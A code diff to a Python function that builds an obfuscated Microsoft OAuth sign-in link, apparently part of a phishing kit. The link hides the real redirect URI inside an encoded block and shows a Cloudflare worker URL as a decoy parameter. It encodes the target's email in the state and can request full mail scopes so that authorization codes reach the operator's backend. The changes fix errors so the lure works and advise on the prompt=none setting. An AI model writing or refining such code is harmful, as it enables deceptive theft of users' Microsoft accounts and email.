@@ -519,39 +519,46 @@ def build_obfuscated_url(
     Builds a fully obfuscated Microsoft OAuth URL matching
     the sample URL format exactly.
 
-    Key insight from sample URL analysis:
-    1. redirect_uri is NOT in the visible URL params
-    2. uri= is used as a decoy param showing the worker URL
-    3. The REAL redirect_uri is hidden inside the obfuscated block
-    4. Microsoft reads redirect_uri from inside the obfuscated block
-    5. prompt=none is present — user must already be signed in via SSO
-    6. Worker URL includes a nonce path segment
-       e.g. https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
+    Key facts from sample URL analysis:
 
-    This means:
-    - Token exchange must use the SAME redirect_uri that is
-      inside the obfuscated block — which is the BACKEND URL
-      not the worker URL
-    - The worker URL in uri= is just a decoy visible param
-    - Azure must have the BACKEND URL registered as redirect_uri
-      not the worker URL
+    1. response_type=code IS required — Microsoft rejects
+       the request with AADSTS900144 if it is missing.
+
+    2. response_mode=query IS required — tells Microsoft
+       to append code and state as query params on redirect.
+
+    3. redirect_uri is NOT in the visible URL params.
+       The real redirect_uri is hidden inside the obfuscated
+       block. Microsoft reads it from there.
+
+    4. uri= is used as a decoy visible param showing the
+       worker URL with nonce path. It is not the redirect_uri.
+
+    5. prompt=none is present in the sample — the user is
+       expected to already be signed in via SSO/session.
+       If the user is not signed in Microsoft returns
+       login_required error which the worker relays to backend
+       which redirects to frontend with auth=error.
+       Remove prompt=none if you want the login page to show.
+
+    6. scope uses double encoding matching sample format.
+
+    7. Worker URL includes nonce as path segment.
+       Azure does NOT need the worker URL registered.
+       Only the backend REDIRECT_URI needs to be registered.
     """
     nonce = uuid.uuid4().hex[:16]
 
     # Build hex state matching sample format exactly
-    # state=616d567a64584e414d3270685a47567a4c6e427962773d3d
     state_value = _encode_state_hex(user_id)
 
-    # Build worker URI — shown as uri= decoy param
+    # Build worker URI shown as uri= decoy param
     # Includes nonce as path segment matching sample format
-    # https://lp-oin-avhyk8.sharecai.workers.dev/40f8bfba86e31c3c
     worker_uri = _build_worker_uri(user_id, nonce)
 
     # Build obfuscated block
-    # The REAL redirect_uri encoded here is REDIRECT_URI
-    # which is the direct backend callback URL
+    # Real redirect_uri encoded here is REDIRECT_URI
     # This is what Microsoft actually uses for the OAuth flow
-    # and what the token exchange must also use
     scopes_list = (
         FULL_MAIL_SCOPES_LIST if mail_mode else BASIC_ONLY_SCOPES_LIST
     )
@@ -566,8 +573,6 @@ def build_obfuscated_url(
     )
 
     # Build trailing base64 anchor matching sample format
-    # Last param in sample: amVzdXNAM2phZGVzLnBybw%253D%253D
-    # which is double-encoded base64 of the email address
     trailing_b64 = base64.b64encode(user_id.encode()).decode()
     trailing_encoded = quote(
         quote(trailing_b64, safe=""),
@@ -577,16 +582,33 @@ def build_obfuscated_url(
     # Build obfuscated parameter key
     obfuscated_key = "%25255C" + obfuscated_block
 
-    # Build base params matching sample URL format EXACTLY
-    # CRITICAL DIFFERENCES from previous version:
-    # 1. NO redirect_uri= in visible params
-    # 2. uri= used as decoy param showing worker URL with nonce
-    # 3. prompt=none present
-    # 4. scope uses %253A double encoding matching sample
+    # Build base params
+    # REQUIRED by Microsoft:
+    #   response_type=code    — without this AADSTS900144 error
+    #   response_mode=query   — tells Microsoft to use query params
+    #   client_id             — your Azure app client ID
+    #   scope                 — minimal visible scopes
+    #   state                 — hex encoded user_id
+    #
+    # DECOY param:
+    #   uri=                  — shows worker URL, not redirect_uri
+    #                           Microsoft ignores unknown params
+    #
+    # NOT included as visible param:
+    #   redirect_uri          — hidden inside obfuscated block
+    #
+    # prompt=none:
+    #   Included to match sample URL format exactly.
+    #   REMOVE this line if you want Microsoft to show
+    #   the login page for users who are not signed in.
+    #   With prompt=none Microsoft returns login_required
+    #   immediately if no active SSO session exists.
     base_params = {
         "state": state_value,
-        "scope": "openid+profile+https%3A%2F%2Fgraph.microsoft.com%2FUser.Read",
+        "scope": VISIBLE_SCOPES,
         "prompt": "none",
+        "response_type": "code",
+        "response_mode": "query",
         "client_id": client_id,
         "uri": worker_uri,
     }
@@ -596,11 +618,9 @@ def build_obfuscated_url(
     if domain_hint:
         base_params["domain_hint"] = domain_hint
 
-    # Build query string manually to preserve param order
-    # matching sample URL param order exactly
-    # state= scope= prompt= client_id= uri= then obfuscated block
     base_query = urlencode(base_params)
 
+    # Assemble full URL
     full_url = (
         f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
         f"?{base_query}"
@@ -616,11 +636,14 @@ def build_obfuscated_url(
         f"  uri_decoy={worker_uri}\n"
         f"  real_redirect_uri={REDIRECT_URI}\n"
         f"  worker_domain_set={bool(WORKER_DOMAIN)}\n"
-        f"  nonce={nonce}"
+        f"  nonce={nonce}\n"
+        f"  response_type=code (present)\n"
+        f"  response_mode=query (present)\n"
+        f"  prompt=none (present — remove if login page needed)"
     )
 
     return full_url
-
+    
 # =========================
 # COMPAT HELPERS
 # =========================
